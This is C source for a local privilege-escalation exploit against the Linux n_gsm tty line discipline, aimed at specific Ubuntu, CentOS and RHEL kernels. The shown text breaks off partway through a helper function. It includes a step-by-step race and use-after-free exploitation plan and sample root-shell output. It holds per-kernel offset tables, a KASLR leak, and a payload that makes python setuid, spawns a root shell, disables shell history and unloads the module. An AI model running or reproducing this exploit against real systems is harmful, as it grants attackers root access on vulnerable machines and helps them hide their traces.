#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <syscall.h>
#include <termios.h>
#include <unistd.h>

#include <linux/gsmmux.h>
#include <linux/tty.h>
#include <linux/userfaultfd.h>

#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <sys/mman.h>

/*
Ubuntu 18.04+20.04 / Centos 8 / RHEL 8 n_gsm LPE exploit

Tested on:
Ubuntu 20.04 Server updated at @ 2020-11-05
Ubuntu 18.04 Server updated at @ 2020-11-05
CentOS 8 Server updated at @ 2020-11-05
RHEL 8 Server updated at @ 2020-11-05

Description:
This exploit targets a race condition bug in the n_gsm tty line dicipline.
The race condition results in a UAF on a struct gsm_dlci while restarting the 
gsm mux.

Background:
In linux 4.13 the timer interfaces changed slightly and workarounds were 
introduced in many parts of the code, including the n_gsm module, leading to 
the introduction of the gsm_disconnect function and a general restructuring of 
the mux restart code.

Step-by-step:
1. Thread1 triggers a config change requiring a restart of the mux
2. Thread1 gets stuck in gsm_disconnect waiting for an answer to the disconnect req
3. We let Thread1 go by responding and it gets stuck waiting for the disconnect
4. Thread2 triggers a config change requiring a reopen of dlci[0]
5. Thread2 gets stuck in gsm_disconnect waiting for an answer to the disconnect req
6. We start a spinner thread bound to the same core as Thread2 to delay waking up
7. We then let Thread2 go by responding to it's request, but since the core is blocked it's still not scheduled
(but in a runnable state, we need to do this because gsm_activate_mux will reset the waitqueue and Thread2 would block forever)
8. We let Thread1 go and execute gsm_activate_mux, which will free the dlci's and reset the mux.
9. We then spray fake gsm_dlci:s by using userfaultfd and add_key, with dlci->gsm poiting to a static buffer
   that we seed with a fake gsm_mux object
10. Thread2 eventually gets scheduled, but still has a dangling reference to the freed dlci[0]
It then executes dlci_begin_close(dlci[0]) which will end up calling dlci->gsm->output(gsm, ...)
11. __rb_aux_free(x) calls x->aux_free(x->aux_priv), now we have the ability to call anything with any argument
12. We call run_cmd("/bin/chmod u+s /usr/bin/python3") to drop a setuid python interpreter
14. The main thread then does some cleanup and spawns a root shell

$ gcc exploit.c -o exploit -lpthread
$ ./exploit
[+] Attempt 1/10
[+] Found kernel '4.18.0-240.1.1.el8_3.x86_64'
[+] Found kernel .text, 0xffffffffa2a00000
[+] UAF seems to have hit
[+] Payload ran correctly, spawning shell
uid=0(root) gid=0(root) groups=0(root),1000(user) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
bash-4.4# 
*/


// <config>

#define VERBOSE
#define NUM_SPRAY 300
#define EXPLOIT_TRIES 10
#define PYTHON_PAYLOAD "import os; os.setresgid(0, 0, 0); os.setresuid(0, 0, 0); os.execl('/bin/bash', 'bash', '-c', 'export HISTFILE=/dev/null;chmod u-s /usr/bin/python3 /usr/libexec/platform-python 2>/dev/null; rmmod n_gsm; id; exec /bin/bash --norc --noprofile');"


struct kern_params
{
	char *name; // uname -r
	unsigned long hypercall_page;
	unsigned long run_cmd; // no nulls
	unsigned long kernfs_pr_cont_buf;
	unsigned long __rb_free_aux; // no nulls
	unsigned long kmem_cache_size;
	unsigned long commit_creds;
	unsigned long init_cred;
};

static struct kern_params kernels_rhel[] = {
	{"4.18.0-240.el8.x86_64", 0x00001000, 0x000dc610, 0x01fc2de0, 0x0021f920, 0x00253d20},
	{"4.18.0-240.1.1.el8_3.x86_64", 0x00001000, 0x000dc610, 0x01fc2de0, 0x0021f920, 0x00253d20},
	{"4.18.0-193.el8.x86_64", 0x00001000, 0x000d78e0, 0x01e6cdc0, 0x0020d705, 0x00241060},
	{"4.18.0-193.28.1.el8_2.x86_64", 0x00001000, 0x000d78d0, 0x01e6edc0, 0x0020dc05, 0x00241500},
	{"4.18.0-193.19.1.el8_2.x86_64", 0x00001000, 0x000d78d0, 0x01e6cdc0, 0x0020db70, 0x00241470},
	{"4.18.0-193.14.3.el8_2.x86_64", 0x00001000, 0x000d78d0, 0x01e6cdc0, 0x0020db70, 0x00241470},
	{"4.18.0-193.13.2.el8_2.x86_64", 0x00001000, 0x000d78d0, 0x01e6cdc0, 0x0020db70, 0x00241470},
	{"4.18.0-193.6.3.el8_2.x86_64", 0x00001000, 0x000d78e0, 0x01e6cdc0, 0x0020db80, 0x002414e0},
	{"4.18.0-193.1.2.el8_2.x86_64", 0x00001000, 0x000d78e0, 0x01e6cdc0, 0x0020db30, 0x00241490},
	{"4.18.0-147.el8.x86_64", 0x00001000, 0x000d63b0, 0x01c8a940, 0x00201dd0, 0x0023cd00},
	{"4.18.0-147.8.1.el8_1.x86_64", 0x00001000, 0x000d64c0, 0x01c8a940, 0x00201d90, 0x0023cd00},
	{"4.18.0-147.5.1.el8_1.x86_64", 0x00001000, 0x000d64c0, 0x01c8a940, 0x00201d90, 0x0023ccc0},
	{"4.18.0-147.3.1.el8_1.x86_64", 0x00001000, 0x000d64c0, 0x01c8a940, 0x00201d90, 0x0023ccc0},
	{"4.18.0-147.0.3.el8_1.x86_64", 0x00001000, 0x000d63e0, 0x01c8a940, 0x00201e05, 0x0023cd30},
	{"4.18.0-147.0.2.el8_1.x86_64", 0x00001000, 0x000d6340, 0x01c88940, 0x00201f70, 0x0023ceb0},
	{"4.18.0-80.el8.x86_64", 0x00001000, 0x000cfb05, 0x01c6c3a0, 0x001ef2e0, 0x00228d30},
	{"4.18.0-80.11.2.el8_0.x86_64", 0x00001000, 0x000cfc05, 0x01c6e3a0, 0x001ef680, 0x002290a0},
	{"4.18.0-80.11.1.el8_0.x86_64", 0x00001000, 0x000cfc05, 0x01c6e3a0, 0x001ef680, 0x002290a0},
	{"4.18.0-80.7.2.el8_0.x86_64", 0x00001000, 0x000cfb20, 0x01c6e3a0, 0x001ef590, 0x00228f90},
	{"4.18.0-80.7.1.el8_0.x86_64", 0x00001000, 0x000cfb20, 0x01c6e3a0, 0x001ef590, 0x00228f90},
	{"4.18.0-80.4.2.el8_0.x86_64", 0x00001000, 0x000cfb20, 0x01c6e3a0, 0x001ef305, 0x00228d50},
	{"4.18.0-80.1.2.el8_0.x86_64", 0x00001000, 0x000cfb20, 0x01c6e3a0, 0x001ef305, 0x00228d50},
	{},
};

static struct kern_params kernels_centos[] = {
	{"4.18.0-240.1.1.el8_3.x86_64", 0x00001000, 0x000dc610, 0x01fc1de0, 0x0021f920, 0x00253d20},
	{"4.18.0-240.el8.x86_64", 0x00001000, 0x000dc610, 0x01fc1de0, 0x0021f920, 0x00253d20},
	{"4.18.0-236.el8.x86_64", 0x00001000, 0x000dc610, 0x01fd0e00, 0x0021f810, 0x00253c10},
	{"4.18.0-227.el8.x86_64", 0x00001000, 0x000dc505, 0x01fcee00, 0x0021f5a0, 0x002539a0},
	{"4.18.0-211.el8.x86_64", 0x00001000, 0x000dadd0, 0x01fa4b60, 0x00218880, 0x0024cb10},
	{"4.18.0-193.el8.x86_64", 0x00001000, 0x000d78e0, 0x01e6cdc0, 0x0020d705, 0x00241060},
	{"4.18.0-193.28.1.el8_2.x86_64", 0x00001000, 0x000d78d0, 0x01e6edc0, 0x0020dc05, 0x00241500},
	{"4.18.0-193.19.1.el8_2.x86_64", 0x00001000, 0x000d78d0, 0x01e6cdc0, 0x0020db70, 0x00241470},
	{"4.18.0-193.14.2.el8_2.x86_64", 0x00001000, 0x000d78d0, 0x01e6cdc0, 0x0020db70, 0x00241470},
	{"4.18.0-193.10.el8.x86_64", 0x00001000, 0x000d8c60, 0x01e7bdc0, 0x00210a60, 0x00244030},
	{"4.18.0-193.6.3.el8_2.x86_64", 0x00001000, 0x000d78e0, 0x01e6cdc0, 0x0020db80, 0x002414e0},
	{"4.18.0-193.1.2.el8_2.x86_64", 0x00001000, 0x000d78e0, 0x01e6cdc0, 0x0020db30, 0x00241490},
	{"4.18.0-187.el8.x86_64", 0x00001000, 0x000d7990, 0x01e6adc0, 0x0020d3c0, 0x00240d10},
	{"4.18.0-177.el8.x86_64", 0x00001000, 0x000d7990, 0x01e6a9c0, 0x0020d250, 0x00240b60},
	{"4.18.0-168.el8.x86_64", 0x00001000, 0x000d7960, 0x01e689a0, 0x0020d110, 0x002409d0},
	{"4.18.0-151.el8.x86_64", 0x00001000, 0x000d6f20, 0x01ca0980, 0x00207360, 0x00242620},
	{"4.18.0-147.el8.x86_64", 0x00001000, 0x000d63b0, 0x01c8a940, 0x00201dd0, 0x0023cd00},
	{"4.18.0-147.8.1.el8_1.x86_64", 0x00001000, 0x000d64c0, 0x01c8a940, 0x00201d90, 0x0023cd00},
	{"4.18.0-147.6.el8.x86_64", 0x00001000, 0x000d6480, 0x01c8c940, 0x002029d0, 0x0023dce0},
	{"4.18.0-147.5.1.el8_1.x86_64", 0x00001000, 0x000d64c0, 0x01c8a940, 0x00201d90, 0x0023ccc0},
	{"4.18.0-147.3.1.el8_1.x86_64", 0x00001000, 0x000d64c0, 0x01c8a940, 0x00201d90, 0x0023ccc0},
	{"4.18.0-147.0.3.el8_1.x86_64", 0x00001000, 0x000d63e0, 0x01c8a940, 0x00201e05, 0x0023cd30},
	{"4.18.0-144.el8.x86_64", 0x00001000, 0x000d6310, 0x01c88940, 0x00201f40, 0x0023ce80},
	{"4.18.0-80.el8.x86_64", 0x00001000, 0x000cfb05, 0x01c6b3a0, 0x001ef2e0, 0x00228d30},
	{"4.18.0-80.11.2.el8_0.x86_64", 0x00001000, 0x000cfc05, 0x01c6e3a0, 0x001ef680, 0x002290a0},
	{"4.18.0-80.11.1.el8_0.x86_64", 0x00001000, 0x000cfc05, 0x01c6e3a0, 0x001ef680, 0x002290a0},
	{"4.18.0-80.7.2.el8_0.x86_64", 0x00001000, 0x000cfb20, 0x01c6e3a0, 0x001ef590, 0x00228f90},
	{"4.18.0-80.7.1.el8_0.x86_64", 0x00001000, 0x000cfb20, 0x01c6d3a0, 0x001ef590, 0x00228f90},
	{"4.18.0-80.4.2.el8_0.x86_64", 0x00001000, 0x000cfb20, 0x01c6d3a0, 0x001ef305, 0x00228d50},
	{"4.18.0-80.1.2.el8_0.x86_64", 0x00001000, 0x000cfb20, 0x01c6d3a0, 0x001ef305, 0x00228d50},
	{},
};

static struct kern_params kernels_ubuntu[] = {
	{"5.8.0-29-generic", 0x2000, 0x0, 0x2171d00, 0x242f20, 0x27bb40, 0xd78d0, 0x1a63080}, // ubuntu 20.10
	{"5.4.0-54-generic", 0x00001000, 0x000ce470, 0x01d43880, 0x00217a20, 0x0024dc20},
	{"5.4.0-52-generic", 0x00001000, 0x000ce470, 0x01d43880, 0x00217a20, 0x0024dc20},
	{"5.4.0-51-generic", 0x00001000, 0x000ce470, 0x01d43880, 0x00217a20, 0x0024dc20},
	{"5.4.0-48-generic", 0x00001000, 0x000ce470, 0x01d43880, 0x00217b60, 0x0024dd30},
	{"5.4.0-47-generic", 0x00001000, 0x000ce470, 0x01d43880, 0x00217a90, 0x0024dc50},
	{"5.4.0-46-generic", 0x00001000, 0x000ce470, 0x01d43880, 0x00217b60, 0x0024dd30},
	{"5.4.0-45-generic", 0x00001000, 0x000ce470, 0x01d43880, 0x00217a90, 0x0024dc50},
	{"5.4.0-44-generic", 0x00001000, 0x000ce470, 0x01d43880, 0x00217a90, 0x0024dc50},
	{"5.4.0-43-generic", 0x00001000, 0x000ce470, 0x01d43880, 0x00217a90, 0x0024dc50},
	{"5.4.0-42-generic", 0x00001000, 0x000ce450, 0x01d42880, 0x002170e0, 0x0024d250},
	{"5.4.0-40-generic", 0x00001000, 0x000ce450, 0x01d42880, 0x002170d0, 0x0024d240},
	{"5.4.0-39-generic", 0x00001000, 0x000ce420, 0x01d42880, 0x00216fd0, 0x0024d140},
	{"5.4.0-37-generic", 0x00001000, 0x000ce420, 0x01d42880, 0x00216fd0, 0x0024d140},
	{"5.4.0-33-generic", 0x00001000, 0x000ce405, 0x01d42900, 0x00217c70, 0x0024dd60},
	{"5.4.0-31-generic", 0x00001000, 0x000ce405, 0x01d42900, 0x00217c70, 0x0024dd60},
	{"5.4.0-30-generic", 0x00001000, 0x000ce405, 0x01d42900, 0x00217c70, 0x0024dd60},
	{"5.4.0-29-generic", 0x00001000, 0x000ce360, 0x01d40900, 0x002176c0, 0x0024d7c0},
	{"5.4.0-28-generic", 0x00001000, 0x000ce360, 0x01d40900, 0x002176c0, 0x0024d7c0},
	{"5.4.0-26-generic", 0x00001000, 0x000ce360, 0x01d40900, 0x002176c0, 0x0024d7c0},
	{"5.4.0-25-generic", 0x00001000, 0x000ce360, 0x01d40900, 0x002176c0, 0x0024d7c0},
	{"5.4.0-24-generic", 0x00001000, 0x000ce360, 0x01d40900, 0x002176c0, 0x0024d7c0},
	{"5.4.0-18-generic", 0x00001000, 0x000ce090, 0x01d40880, 0x002164b0, 0x0024c550},
	{"5.4.0-17-generic", 0x00001000, 0x000ce0d0, 0x01d40880, 0x00216505, 0x0024c590},
	{"5.4.0-15-generic", 0x00001000, 0x000ce0c0, 0x01d40840, 0x00216410, 0x0024c4a0},
	{"5.4.0-9-generic", 0x00001000, 0x000c4940, 0x01d34640, 0x0020c0f0, 0x00241f80},
	{"5.3.0-52-generic", 0x00001000, 0x000c8790, 0x01d26e40, 0x0020ee05, 0x00243d70},
	{"5.3.0-51-generic", 0x00001000, 0x000c8720, 0x01d26e40, 0x0020e960, 0x00243880},
	{"5.3.0-48-generic", 0x00001000, 0x000c8720, 0x01d26e40, 0x0020e960, 0x00243880},
	{"5.3.0-46-generic", 0x00001000, 0x000c8410, 0x01d26e00, 0x0020e440, 0x00243330},
	{"5.3.0-45-generic", 0x00001000, 0x000c8410, 0x01d26e00, 0x0020e380, 0x00243370},
	{"5.3.0-43-generic", 0x00001000, 0x000c8410, 0x01d26e40, 0x0020e7f0, 0x002436e0},
	{"5.3.0-42-generic", 0x00001000, 0x000c8410, 0x01d26e00, 0x0020e6a0, 0x00243690},
	{"5.3.0-41-generic", 0x00001000, 0x000c8410, 0x01d26e00, 0x0020e6a0, 0x00243690},
	{"5.3.0-40-generic", 0x00001000, 0x000c54a0, 0x01d23de0, 0x0020b440, 0x00240420},
	{"5.3.0-29-generic", 0x00001000, 0x000c53f0, 0x01d23dc0, 0x0020ad20, 0x0023fce0},
	{"5.3.0-26-generic", 0x00001000, 0x000c53f0, 0x01d23dc0, 0x0020ad20, 0x0023fce0},
	{"5.3.0-24-generic", 0x00001000, 0x000c53a0, 0x01d23dc0, 0x0020ac70, 0x0023fc20},
	{"5.3.0-23-generic", 0x00001000, 0x000c53a0, 0x01d23dc0, 0x0020acd0, 0x0023fcc0},
	{"5.3.0-22-generic", 0x00001000, 0x000c53a0, 0x01d23dc0, 0x0020acd0, 0x0023fcc0},
	{"5.3.0-19-generic", 0x00001000, 0x000c5260, 0x01d23dc0, 0x0020a3e0, 0x0023f3b0},
	{"5.3.0-18-generic", 0x00001000, 0x000c5260, 0x01d23dc0, 0x0020a3e0, 0x0023f3b0},
	{"5.0.0-40-generic", 0x00001000, 0x000c0cf0, 0x01d01660, 0x001f6890, 0x002338e0},
	{"5.0.0-38-generic", 0x00001000, 0x000c0cf0, 0x01d01660, 0x001f6830, 0x00233880},
	{"5.0.0-13-generic", 0x00001000, 0x000bf150, 0x01cfd660, 0x001f2710, 0x0022f320},
	{"4.18.0-26-generic", 0x00001000, 0x000b78c0, 0x01b19940, 0x001e5a90, 0x0021fb80},
	{"4.18.0-25-generic", 0x00001000, 0x000b78a0, 0x01b19940, 0x001e5a70, 0x0021fb60},
	{"4.18.0-20-generic", 0x00001000, 0x000b6fb0, 0x01b19940, 0x001e3ad0, 0x0021dbd0},
	{"4.18.0-10-generic", 0x00001000, 0x000b5ec0, 0x01b15940, 0x001e22a0, 0x0021c330},
	{"4.15.0-124-generic", 0x00001000, 0x000b5230, 0x01af14c0, 0x001cd670, 0x00206f20},
	{"4.15.0-122-generic", 0x00001000, 0x000b5230, 0x01af14c0, 0x001cd670, 0x00206f20},
	{"4.15.0-121-generic", 0x00001000, 0x000b5230, 0x01af14c0, 0x001cd670, 0x00206f20},
	{"4.15.0-118-generic", 0x00001000, 0x000b5230, 0x01af14c0, 0x001cd580, 0x00206e20},
	{"4.15.0-117-generic", 0x00001000, 0x000b5230, 0x01af14c0, 0x001cd570, 0x00206e10},
	{"4.15.0-116-generic", 0x00001000, 0x000b5230, 0x01af14c0, 0x001cd580, 0x00206e20},
	{"4.15.0-115-generic", 0x00001000, 0x000b5230, 0x01af14c0, 0x001cd570, 0x00206e10},
	{"4.15.0-114-generic", 0x00001000, 0x000b5230, 0x01af14c0, 0x001cd570, 0x00206e10},
	{"4.15.0-113-generic", 0x00001000, 0x000b5230, 0x01af14c0, 0x001cd570, 0x00206e10},
	{"4.15.0-112-generic", 0x00001000, 0x000b5230, 0x01af14c0, 0x001cd1c0, 0x00206a30},
	{"4.15.0-111-generic", 0x00001000, 0x000b5230, 0x01af14c0, 0x001cd1c0, 0x00206a30},
	{"4.15.0-109-generic", 0x00001000, 0x000b5230, 0x01af14c0, 0x001cd1c0, 0x00206a30},
	{"4.15.0-108-generic", 0x00001000, 0x000b5205, 0x01af14c0, 0x001cd160, 0x00206aa0},
	{"4.15.0-106-generic", 0x00001000, 0x000b5205, 0x01af14c0, 0x001cd160, 0x00206aa0},
	{"4.15.0-101-generic", 0x00001000, 0x000b5205, 0x01aed4c0, 0x001cd130, 0x00206a50},
	{"4.15.0-100-generic", 0x00001000, 0x000b5205, 0x01aed4c0, 0x001cd130, 0x00206a50},
	{"4.15.0-99-generic", 0x00001000, 0x000b51e0, 0x01aed4c0, 0x001cd360, 0x00206c80},
	{"4.15.0-97-generic", 0x00001000, 0x000b51e0, 0x01aed4c0, 0x001cd360, 0x00206c80},
	{"4.15.0-96-generic", 0x00001000, 0x000b4f70, 0x01aed4c0, 0x001ccca0, 0x00206550},
	{"4.15.0-92-generic", 0x00001000, 0x000b4f70, 0x01aed4c0, 0x001ccca0, 0x00206550},
	{"4.15.0-91-generic", 0x00001000, 0x000b4f70, 0x01aed4c0, 0x001ccb05, 0x002064c0},
	{"4.15.0-89-generic", 0x00001000, 0x000b4f70, 0x01aed4c0, 0x001ccb05, 0x002064c0},
	{"4.15.0-88-generic", 0x00001000, 0x000b4f60, 0x01aec4c0, 0x001cca40, 0x002063f0},
	{"4.15.0-87-generic", 0x00001000, 0x000b4f60, 0x01aec4c0, 0x001cca40, 0x002063f0},
	{"4.15.0-76-generic", 0x00001000, 0x000b4f60, 0x01aec4a0, 0x001cc5a0, 0x00205fa0},
	{"4.15.0-74-generic", 0x00001000, 0x000b4f60, 0x01aec4a0, 0x001cc5a0, 0x00205fa0},
	{"4.15.0-72-generic", 0x00001000, 0x000b4f20, 0x01aec4a0, 0x001cc530, 0x00205f30},
	{"4.15.0-70-generic", 0x00001000, 0x000b4f70, 0x01aee4a0, 0x001cc460, 0x00205e30},
	{"4.15.0-69-generic", 0x00001000, 0x000b4f70, 0x01aee4a0, 0x001cc460, 0x00205e30},
	{"4.15.0-66-generic", 0x00001000, 0x000b4ed0, 0x01aee4a0, 0x001cc505, 0x00205ec0},
	{"4.15.0-65-generic", 0x00001000, 0x000b4f30, 0x01aee4a0, 0x001cc550, 0x00205f10},
	{"4.15.0-64-generic", 0x00001000, 0x000b4f10, 0x01aed4a0, 0x001cc2a0, 0x00205c20},
	{"4.15.0-62-generic", 0x00001000, 0x000b4f10, 0x01aed4a0, 0x001cc2a0, 0x00205c20},
	{"4.15.0-60-generic", 0x00001000, 0x000b4f10, 0x01aed4a0, 0x001cc2a0, 0x00205c20},
	{"4.15.0-58-generic", 0x00001000, 0x000b2c50, 0x01aea4a0, 0x001c6f40, 0x00200640},
	{"4.15.0-55-generic", 0x00001000, 0x000b24d0, 0x01ae44a0, 0x001c6340, 0x001ff970},
	{"4.15.0-54-generic", 0x00001000, 0x000b2260, 0x01ae44a0, 0x001c60d0, 0x001ff700},
	{"4.15.0-52-generic", 0x00001000, 0x000b2230, 0x01ae44a0, 0x001c5df0, 0x001ff3f0},
	{"4.15.0-51-generic", 0x00001000, 0x000b2230, 0x01ae44a0, 0x001c5df0, 0x001ff3f0},
	{"4.15.0-50-generic", 0x00001000, 0x000b2230, 0x01ae64a0, 0x001c5df0, 0x001ff3f0},
	{"4.15.0-48-generic", 0x00001000, 0x000b2210, 0x01ae44a0, 0x001c5dd0, 0x001ff3d0},
	{"4.15.0-47-generic", 0x00001000, 0x000b0c90, 0x01ae44a0, 0x001c4810, 0x001fddc0},
	{"4.15.0-46-generic", 0x00001000, 0x000b0c80, 0x01ae44a0, 0x001c3fa0, 0x001fd310},
	{"4.15.0-45-generic", 0x00001000, 0x000b0af0, 0x01ae44a0, 0x001c3e20, 0x001fd0e0},
	{"4.15.0-44-generic", 0x00001000, 0x000b0af0, 0x01ae44a0, 0x001c3e20, 0x001fd0e0},
	{"4.15.0-43-generic", 0x00001000, 0x000b0ac0, 0x01ae44a0, 0x001c3ce0, 0x001fcfa0},
	{"4.15.0-42-generic", 0x00001000, 0x000b0ac0, 0x01ae44a0, 0x001c3be0, 0x001fcea0},
	{"4.15.0-39-generic", 0x00001000, 0x000b0ac0, 0x01ae44a0, 0x001c3b70, 0x001fce60},
	{"4.15.0-38-generic", 0x00001000, 0x000b0ac0, 0x01ae44a0, 0x001c3b70, 0x001fce60},
	{"4.15.0-36-generic", 0x00001000, 0x000b0a10, 0x01ae44a0, 0x001c3a30, 0x001fcd20},
	{"4.15.0-34-generic", 0x00001000, 0x000b09a0, 0x01ae44a0, 0x001c3940, 0x001fcc40},
	{"4.15.0-33-generic", 0x00001000, 0x000b08e0, 0x01ae44a0, 0x001c36d0, 0x001fc9d0},
	{"4.15.0-32-generic", 0x00001000, 0x000b08f0, 0x01ae44a0, 0x001c36b0, 0x001fc930},
	{"4.15.0-30-generic", 0x00001000, 0x000b0140, 0x01ae44a0, 0x001c2ec0, 0x001fc090},
	{"4.15.0-29-generic", 0x00001000, 0x000b0140, 0x01ae44a0, 0x001c2ec0, 0x001fc090},
	{"4.15.0-24-generic", 0x00001000, 0x000b0140, 0x01ae44a0, 0x001c2ec0, 0x001fc090},
	{"4.15.0-23-generic", 0x00001000, 0x000b0150, 0x01ae44a0, 0x001c3170, 0x001fc2e0},
	{"4.15.0-22-generic", 0x00001000, 0x000af120, 0x01ae34a0, 0x001c1fc0, 0x001fb130},
	{"4.15.0-20-generic", 0x00001000, 0x000af080, 0x01ae34a0, 0x001c1ee0, 0x001fb050},
	{},
};

// </config>

// <globals>
static struct gsm_config gsm_conf;
static int gsm_slave_fd = -1;
static int gsm_master_fd =-1;
static pid_t tids[4];
static pid_t sprayer_tids[NUM_SPRAY];
static int t0_done = 0;
static int t1_done = 0;
static int t2_done = 0;
static pthread_barrier_t barr1;
static pthread_barrier_t barr2;
static pthread_barrier_t barr3;
static pthread_barrier_t barr4;
static struct kern_params *kernel_table = NULL;
static struct kern_params *selected_kernel = NULL;
static unsigned long kernel_base;
static int num_cores;
static pid_t sprayer_pid;
static int sprayer_pipe[2];
static int sprayer_pipe2[2];
static int ufd_fd = -1;
static int payload_setup = 0;
// </globals>

#ifdef VERBOSE
	static void _print(int lineno, int error, char *prefix, char *fmt, ...)
	{
		va_list va;

		printf("%s ", prefix);
		va_start(va, fmt);
		vprintf(fmt, va);
		va_end(va);

		if(error) printf(" (%s)", strerror(errno));
		if(lineno) printf(" (line %d)", lineno);
		printf("\n");
	}

	#define die(...) { _print(__LINE__, 1, "[-] Fatal:", __VA_ARGS__); exit(1); }
	#define warn(...) { _print(0, 0, "[!]", __VA_ARGS__); }
	#define info(...) { _print(0, 0, "[i]", __VA_ARGS__); }
	#define notice(...) { _print(0, 0, "[+]", __VA_ARGS__); }

#else
	#define die(...) { printf("Fatal error\n"); exit(1); }
	#define warn(...) {}
	#define info(...) {}
	#define notice(...) {}
#endif

static unsigned char gsm_fcs8[256] = {
	0x00, 0x91, 0xE3, 0x72, 0x07, 0x96, 0xE4, 0x75,
	0x0E, 0x9F, 0xED, 0x7C, 0x09, 0x98, 0xEA, 0x7B,
	0x1C, 0x8D, 0xFF, 0x6E, 0x1B, 0x8A, 0xF8, 0x69,
	0x12, 0x83, 0xF1, 0x60, 0x15, 0x84, 0xF6, 0x67,
	0x38, 0xA9, 0xDB, 0x4A, 0x3F, 0xAE, 0xDC, 0x4D,
	0x36, 0xA7, 0xD5, 0x44, 0x31, 0xA0, 0xD2, 0x43,
	0x24, 0xB5, 0xC7, 0x56, 0x23, 0xB2, 0xC0, 0x51,
	0x2A, 0xBB, 0xC9, 0x58, 0x2D, 0xBC, 0xCE, 0x5F,
	0x70, 0xE1, 0x93, 0x02, 0x77, 0xE6, 0x94, 0x05,
	0x7E, 0xEF, 0x9D, 0x0C, 0x79, 0xE8, 0x9A, 0x0B,
	0x6C, 0xFD, 0x8F, 0x1E, 0x6B, 0xFA, 0x88, 0x19,
	0x62, 0xF3, 0x81, 0x10, 0x65, 0xF4, 0x86, 0x17,
	0x48, 0xD9, 0xAB, 0x3A, 0x4F, 0xDE, 0xAC, 0x3D,
	0x46, 0xD7, 0xA5, 0x34, 0x41, 0xD0, 0xA2, 0x33,
	0x54, 0xC5, 0xB7, 0x26, 0x53, 0xC2, 0xB0, 0x21,
	0x5A, 0xCB, 0xB9, 0x28, 0x5D, 0xCC, 0xBE, 0x2F,
	0xE0, 0x71, 0x03, 0x92, 0xE7, 0x76, 0x04, 0x95,
	0xEE, 0x7F, 0x0D, 0x9C, 0xE9, 0x78, 0x0A, 0x9B,
	0xFC, 0x6D, 0x1F, 0x8E, 0xFB, 0x6A, 0x18, 0x89,
	0xF2, 0x63, 0x11, 0x80, 0xF5, 0x64, 0x16, 0x87,
	0xD8, 0x49, 0x3B, 0xAA, 0xDF, 0x4E, 0x3C, 0xAD,
	0xD6, 0x47, 0x35, 0xA4, 0xD1, 0x40, 0x32, 0xA3,
	0xC4, 0x55, 0x27, 0xB6, 0xC3, 0x52, 0x20, 0xB1,
	0xCA, 0x5B, 0x29, 0xB8, 0xCD, 0x5C, 0x2E, 0xBF,
	0x90, 0x01, 0x73, 0xE2, 0x97, 0x06, 0x74, 0xE5,
	0x9E, 0x0F, 0x7D, 0xEC, 0x99, 0x08, 0x7A, 0xEB,
	0x8C, 0x1D, 0x6F, 0xFE, 0x8B, 0x1A, 0x68, 0xF9,
	0x82, 0x13, 0x61, 0xF0, 0x85, 0x14, 0x66, 0xF7,
	0xA8, 0x39, 0x4B, 0xDA, 0xAF, 0x3E, 0x4C, 0xDD,
	0xA6, 0x37, 0x45, 0xD4, 0xA1, 0x30, 0x42, 0xD3,
	0xB4, 0x25, 0x57, 0xC6, 0xB3, 0x22, 0x50, 0xC1,
	0xBA, 0x2B, 0x59, 0xC8, 0xBD, 0x2C, 0x5E, 0xCF
};

#define GSM0_SOF	0xF9
#define GSM1_SOF	0x7E
#define UI		0x03
#define EA		0x01
#define PF		0x10
#define SABM		0x2f
#define DISC		0x43

#define CMD_CLD		0x61
#define CMD_FCOFF	0x31
#define CMD_TEST	0x11

#define INIT_FCS	0xFF
#define GOOD_FCS	0xCF

static unsigned char gsm_fcs_add_block(unsigned char fcs, unsigned char *c, int len)
{
	while (len--)
	fcs = gsm_fcs8[fcs ^ *c++];
	return fcs;
}

static void select_kernel()
{
	int i;
	struct utsname uts;
	char name[128];

	if(uname(&uts)) die("uname");

	name[0] = 0;

	if(strlen(uts.release) + 1 > sizeof(name)) die("uname");

	strcat(name, uts.release);

	for(i = 0; kernel_table[i].name != NULL; i++)
	{
		if(!strcmp(kernel_table[i].name, name)) { selected_kernel = &kernel_table[i]; break; }
	}

	if(selected_kernel == NULL) die("could not find kernel '%s'", name);

	notice("Found kernel '%s' [%s]", name, selected_kernel->run_cmd ? "run_cmd" : "commit_cred");
}

static char *python_path()
{
	if(!access("/usr/libexec/platform-python", F_OK)) return "/usr/libexec/platform-python";
	if(!access("/usr/bin/python3", F_OK)) return "/usr/bin/python3";
	die("python");
}

static unsigned long xen_kaslr_leak()
{
	int fd;
	unsigned int namesz, descsz, type, pad;
	char name[256];
	char desc[256];
	unsigned long p = 0;

	fd = open("/sys/kernel/notes", O_RDONLY);
	if(fd < 0) die("open");

	while(1)
	{
		if(read(fd, &namesz, sizeof namesz) != sizeof namesz) break;
		if(read(fd, &descsz, sizeof descsz) != sizeof descsz) break;
		if(read(fd, &type, sizeof type) != sizeof type) break;

		if(namesz > sizeof name) die("notesz");
		if(descsz > sizeof desc) die("descsz");

		if(read(fd, &name, namesz) != namesz) break;
		if(read(fd, &desc, descsz) != descsz) break;

		if(!strcmp(name, "Xen") && type == 2 && descsz == 8) { p = *(unsigned long*)&desc; break; }

		pad = 4 - ((namesz + descsz) % 4);
		if(pad < 4) if(read(fd, &name, pad) != pad) break;
	}

	if(!p) die("could not find Xen elf note");

	close(fd);

	return p;
}

pid_t gettid()
{
	return syscall(SYS_gettid);
}

static int tkill(int tid, int sig)
{
	return syscall(SYS_tkill, tid, sig);
}

static char get_state(pid_t pid, pid_t tid)
{
	char path[64];
	int fd;
	char buf[256];
	int ret;
	char *p;

	snprintf(path, sizeof path, "/proc/%u/task/%u/stat", pid, tid);

	fd = open(path, O_RDONLY);
	if(fd < 0) return 0;

	ret = read(fd, &buf, sizeof buf - 1);
	if(ret < 0) { close(fd); return 0; }

	buf[ret] = 0;

	// 16275 (cat) R 16272

	p = buf;
	p = strtok(p, " ");
	if(!p) return 0;
	p = strtok(NULL, " ");
	if(!p) return 0;
	p = strtok(NULL, " ");
	if(!p) return 0;

	close(fd);

	return *p;
}

static void set_core(int core)
{
	cpu_set_t set;

	CPU_ZERO(&set);
	CPU_SET(core, &set);

